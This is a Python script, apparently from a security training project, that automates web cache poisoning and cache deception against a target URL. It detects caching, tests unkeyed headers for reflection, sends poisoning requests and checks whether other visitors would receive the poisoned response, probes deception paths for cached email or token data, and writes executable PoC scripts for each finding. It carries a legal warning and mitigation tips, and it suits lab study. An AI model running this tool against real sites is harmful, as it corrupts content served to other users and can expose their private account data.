#!/usr/bin/env python3
"""
Web Cache Poisoning Exploitation Toolkit
Project #34: Web Cache Poisoning & Deception

LEGAL: Only test your own apps, PortSwigger labs, or your own infrastructure.
"""

import sys
import os
import re
import json
import time
import argparse
import datetime
import urllib3
from urllib.parse import urljoin

import requests

from cache_payloads import (
    CACHE_HEADERS, UNKEYED_HEADERS, POISON_PAYLOADS,
    DECEPTION_PATHS, bypass_techniques,
    REFLECTION_SIGNATURES, python_poc, curl_poc, score_finding,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

class CacheToolkit:
    def __init__(self, target, timeout=10, delay=0.5,
                 output_dir='.', verbose=False):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        self.target = target
        self.timeout = timeout
        self.delay = delay
        self.output_dir = output_dir
        self.verbose = verbose

        os.makedirs(f"{output_dir}/cache_pocs", exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 Cache Toolkit',
        })

        self.results = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'vulnerable': False,
            'cache_headers_found': {},
            'cache_detected': False,
            'unkeyed_inputs': [],
            'poisoning_findings': [],
            'deception_findings': [],
            'bypass_findings': [],
            'pocs': [],
            'error': None,
        }

    def _req(self, url, method='GET', headers=None, params=None, allow_redirects=False):
        time.sleep(self.delay)
        try:
            return self.session.request(
                method, url, headers=headers or {}, params=params or {},
                timeout=self.timeout, verify=False,
                allow_redirects=allow_redirects,
            )
        except Exception as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] {str(e)[:60]}{Colors.RESET}")
            return None

    def _reset_cache(self):
        """Reset the app's internal cache between tests."""
        try:
            self._req(urljoin(self.target, '/cache-reset'), allow_redirects=True)
        except Exception:
            pass

    # ------------------------------------------------------------------ #
    # PHASE 1: CACHE DETECTION
    # ------------------------------------------------------------------ #
    def phase1_detect(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 1: CACHE DETECTION{Colors.RESET}")
        print(f"    Target: {self.target}")

        r = self._req(self.target)
        if not r:
            print(f"{Colors.RED}[!] Cannot reach target{Colors.RESET}")
            self.results['error'] = 'unreachable'
            return

        print(f"    Response: HTTP {r.status_code}, {len(r.text)} bytes")

        found = {}
        for hdr in CACHE_HEADERS:
            if hdr in r.headers:
                val = r.headers[hdr]
                found[hdr] = val
                print(f"      {Colors.CYAN}{hdr}{Colors.RESET}: {val}")

        self.results['cache_headers_found'] = found

        if found:
            self.results['cache_detected'] = True
            print(f"\n    {Colors.GREEN}[+] Cache headers detected!{Colors.RESET}")

            # Extract TTL
            cc = found.get('Cache-Control', '')
            m = re.search(r'max-age=(\d+)', cc)
            if m:
                ttl = int(m.group(1))
                print(f"    {Colors.GREEN}[+] Cache TTL: {ttl}s{Colors.RESET}")
                self.results['cache_ttl'] = ttl
        else:
            print(f"    {Colors.YELLOW}[~] No cache headers found{Colors.RESET}")

    # ------------------------------------------------------------------ #
    # PHASE 2: UNKEYED INPUT DISCOVERY
    # ------------------------------------------------------------------ #
    def phase2_unkeyed(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 2: UNKEYED INPUT DISCOVERY{Colors.RESET}")
        print(f"    Testing {len(UNKEYED_HEADERS)} headers for reflection...")

        for hdr, val in UNKEYED_HEADERS.items():
            self._reset_cache()
            r = self._req(self.target, headers={hdr: val})
            if not r:
                continue

            # Check if the header value was reflected
            reflected = False
            for sig_name, pattern in REFLECTION_SIGNATURES.items():
                if re.search(pattern, r.text, re.IGNORECASE):
                    reflected = True
                    print(f"      {Colors.RED}[+]{Colors.RESET} [{hdr:20}] "
                          f"REFLECTED ({sig_name})")
                    break

            # Special handling for X-Original-URL
            if hdr in ('X-Original-URL', 'X-Rewrite-URL') and val == '/admin':
                r2 = self._req(self.target, headers={hdr: val})
                if r2 and 'ADMIN' in r2.text.upper():
                    reflected = True
                    print(f"      {Colors.RED}[+]{Colors.RESET} [{hdr:20}] "
                          f"BYPASS WORKS (admin access)")

            if reflected:
                self.results['unkeyed_inputs'].append({
                    'header': hdr, 'value': val,
                    'signature': sig_name if 'sig_name' in dir() else 'reflected',
                })
                self.results['vulnerable'] = True
            else:
                if self.verbose:
                    print(f"      {Colors.YELLOW}[-]{Colors.RESET} [{hdr:20}] not reflected")

    # ------------------------------------------------------------------ #
    # PHASE 3: CACHE POISONING
    # ------------------------------------------------------------------ #
    def phase3_poisoning(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 3: CACHE POISONING{Colors.RESET}")

        for name, spec in POISON_PAYLOADS.items():
            self._reset_cache()

            # Step 1: Send poison request
            poison_headers = dict(spec['headers'])
            r1 = self._req(self.target, headers=poison_headers)
            if not r1:
                continue

            # Step 2: Send clean request (no headers)
            r2 = self._req(self.target)
            if not r2:
                continue

            # Did the poisoned content persist?
            poisoned = False
            sigs_matched = []
            for sig_name, pattern in REFLECTION_SIGNATURES.items():
                if re.search(pattern, r2.text, re.IGNORECASE):
                    poisoned = True
                    sigs_matched.append(sig_name)

            if poisoned:
                severity = score_finding(name)
                print(f"      {Colors.RED}[+]{Colors.RESET} [{name:22}] "
                      f"CACHE POISONED ({severity})")
                print(f"        Signatures: {', '.join(sigs_matched)}")
                self.results['poisoning_findings'].append({
                    'type': name,
                    'description': spec['desc'],
                    'severity': severity,
                    'signatures': sigs_matched,
                })
                self.results['vulnerable'] = True
            else:
                print(f"      {Colors.YELLOW}[~]{Colors.RESET} [{name:22}] no poison")

    # ------------------------------------------------------------------ #
    # PHASE 4: CACHE DECEPTION
    # ------------------------------------------------------------------ #
    def phase4_deception(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 4: CACHE DECEPTION{Colors.RESET}")

        for path in DECEPTION_PATHS:
            url = urljoin(self.target, path)
            self._reset_cache()

            r = self._req(url)
            if not r:
                continue

            cache_ctl = r.headers.get('Cache-Control', '')
            content_type = r.headers.get('Content-Type', '')

            # Deception if response contains sensitive data AND is cacheable
            is_cacheable = 'public' in cache_ctl or 'max-age' in cache_ctl
            has_sensitive = 'email' in r.text.lower() or 'token' in r.text.lower()

            if is_cacheable and has_sensitive:
                print(f"      {Colors.RED}[+]{Colors.RESET} [{path[:40]:40}] "
                      f"DECEPTION ({content_type})")
                self.results['deception_findings'].append({
                    'path': path,
                    'cache_control': cache_ctl,
                    'content_type': content_type,
                    'has_sensitive_data': True,
                })
                self.results['vulnerable'] = True
            else:
                if self.verbose:
                    print(f"      {Colors.YELLOW}[-]{Colors.RESET} {path[:40]}")

    # ------------------------------------------------------------------ #
    # PHASE 5: CACHE BYPASS
    # ------------------------------------------------------------------ #
    def phase5_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 5: CACHE BYPASS{Colors.RESET}")

        for name, url, headers in bypass_techniques(self.target):
            self._reset_cache()

            # Prime the cache
            self._req(self.target)

            # Try bypass
            r = self._req(url, headers=headers)
            if not r:
                continue

            xcache = r.headers.get('X-Cache', '') or r.headers.get('CF-Cache-Status', '')
            bypassed = 'MISS' in xcache.upper()

            if bypassed:
                print(f"      {Colors.GREEN}[+]{Colors.RESET} [{name:14}] "
                      f"BYPASSED (X-Cache: {xcache})")
                self.results['bypass_findings'].append({
                    'name': name, 'url': url, 'headers': headers,
                    'x_cache': xcache,
                })
            else:
                if self.verbose:
                    print(f"      {Colors.YELLOW}[-]{Colors.RESET} [{name:14}] not bypassed")

    # ------------------------------------------------------------------ #
    # PHASE 6: POC GENERATION
    # ------------------------------------------------------------------ #
    def phase6_pocs(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 6: POC GENERATION{Colors.RESET}")

        # Generate PoCs for each confirmed finding
        for finding in self.results['poisoning_findings']:
            name = finding['type']
            spec = POISON_PAYLOADS.get(name, {})
            headers = spec.get('headers', {})
            desc = spec.get('desc', 'Cache poisoning')

            py_content = python_poc(self.target, headers, desc)
            py_path = f"{self.output_dir}/cache_pocs/poc_{name}.py"
            with open(py_path, 'w') as f:
                f.write(py_content)
            os.chmod(py_path, 0o755)

            sh_content = curl_poc(self.target, headers, desc)
            sh_path = f"{self.output_dir}/cache_pocs/poc_{name}.sh"
            with open(sh_path, 'w') as f:
                f.write(sh_content)
            os.chmod(sh_path, 0o755)

            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{name}.py")
            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{name}.sh")

            self.results['pocs'].append({
                'name': name, 'python': py_path, 'shell': sh_path,
            })

        if not self.results['pocs']:
            print(f"      {Colors.YELLOW}No findings — no PoCs to generate{Colors.RESET}")

    # ------------------------------------------------------------------ #
    def save_reports(self):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        json_path = f"{self.output_dir}/cache_report_{ts}.json"
        with open(json_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n{Colors.GREEN}[✓] JSON report: {json_path}{Colors.RESET}")

    def print_summary(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] EXPLOITATION SUMMARY{Colors.RESET}")
        print(f"    Vulnerability:   Web Cache Poisoning")
        print(f"    Cache detected:  {self.results['cache_detected']}")
        print(f"    Unkeyed inputs:  {len(self.results['unkeyed_inputs'])}")
        print(f"    Poisonings:      {len(self.results['poisoning_findings'])}")
        print(f"    Deceptions:      {len(self.results['deception_findings'])}")
        print(f"    Bypasses:        {len(self.results['bypass_findings'])}")
        print(f"    PoCs generated:  {len(self.results['pocs'])}")

        sev_color = Colors.RED if self.results['vulnerable'] else Colors.GREEN
        sev = 'HIGH to CRITICAL' if self.results['vulnerable'] else 'LOW'
        print(f"    Severity:        {sev_color}{sev}{Colors.RESET}")

        print(f"\n    {Colors.YELLOW}Mitigation:{Colors.RESET}")
        print(f"        1. Cache only static content")
        print(f"        2. Strip unkeyed headers (X-Forwarded-*, X-Host, etc.)")
        print(f"        3. Use Vary header correctly")
        print(f"        4. Cache-Control: private for user data")
        print(f"        5. Never trust unkeyed inputs in HTML output")
        print(f"        6. Whitelist cacheable routes")

    def run(self):
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}Web Cache Poisoning Exploitation Toolkit{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}Target: {self.target}{Colors.RESET}")

        self.phase1_detect()
        self.phase2_unkeyed()
        self.phase3_poisoning()
        self.phase4_deception()
        self.phase5_bypass()
        self.phase6_pocs()

        self.print_summary()
        self.save_reports()

def main():
    p = argparse.ArgumentParser(
        description="Web Cache Poisoning Toolkit (Project #34)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python cache_toolkit.py "http://localhost:6000"
  python cache_toolkit.py "http://localhost:6000" --verbose
        """
    )
    p.add_argument('url', help='Target URL')
    p.add_argument('--timeout', type=int, default=10)
    p.add_argument('--delay', type=float, default=0.5)
    p.add_argument('-o', '--output', default='.')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("  WEB CACHE POISONING EXPLOITATION")
    print("  Project #34: Cache Poisoning & Deception")
    print("=" * 70)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Legal: Only test your own apps, PortSwigger labs, or your own infra.{Colors.RESET}\n")

    toolkit = CacheToolkit(
        target=args.url,
        timeout=args.timeout,
        delay=args.delay,
        output_dir=args.output,
        verbose=args.verbose,
    )
    toolkit.run()

if __name__ == '__main__':
    main()